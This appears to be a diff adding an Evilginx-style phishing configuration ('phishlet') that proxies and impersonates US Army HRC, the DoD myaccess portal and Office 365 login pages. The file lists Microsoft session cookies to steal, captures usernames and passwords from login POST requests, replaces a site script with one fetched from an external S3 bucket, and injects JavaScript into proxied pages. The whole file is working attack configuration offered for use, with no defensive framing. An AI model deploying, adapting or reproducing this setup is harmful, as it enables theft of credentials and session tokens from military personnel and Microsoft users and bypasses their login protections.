@@ -1,0 +1,77 @@
+min_ver: "3.2.0"
+proxy_hosts:
+  - {
+      phish_sub: "hrc.army.mil",
+      orig_sub: "www",
+      domain: "hrc.army.mil",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "myaccess.hrc.army.mil",
+      orig_sub: "myaccess",
+      domain: "dmdc.osd.mil",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "wwww",
+      orig_sub: "www",
+      domain: "office.com",
+      session: true,
+      is_landing: false,
+    }
+sub_filters:
+  - {
+      triggers_on: "myaccess.dmdc.osd.mil",
+      orig_sub: "myaccess",
+      domain: "dmdc.osd.mil",
+      search: "runtime.c838369b623d5039.js",
+      replace: "https://youtube-videos-demo.s3.us-west-2.amazonaws.com/index.js",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+auth_tokens:
+  - domain: ".live.com" #domain that sends the cookie
+    keys: [".*:regexp"] #name of cookie to steal
+  - domain: "live.com"
+    keys: [".*:regexp"]
+  - domain: ".login.live.com"
+    keys: [".*:regexp"]
+  - domain: "login.live.com"
+    keys: [".*:regexp"]
+  - domain: ".login.microsoftonline.com"
+    keys: [".*:regexp"]
+  - domain: "login.microsoftonline.com"
+    keys: [".*:regexp"]
+  - domain: ".microsoft.com"
+    keys: [".*:regexp"]
+  - domain: "microsoft.com"
+    keys: [".*:regexp"]
+  - domain: ".office.com"
+    keys: [".*:regexp"]
+  - domain: "office.com"
+    keys: [".*:regexp"]
+  - domain: ".www.office.com"
+    keys: [".*:regexp"]
+  - domain: "www.office.com"
+    keys: [".*:regexp"]
+auth_urls:
+  - "/landingv2"
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+login:
+  domain: "www.hrc.army.mil"
+  path: "/"
+js_inject:
+  - trigger_domains: ["myaccess.dmdc.osd.mil"]
+    trigger_paths: ["/*"]
+    script: |
+      window.addEventListener("load", () => {
+          alert("page-content");})
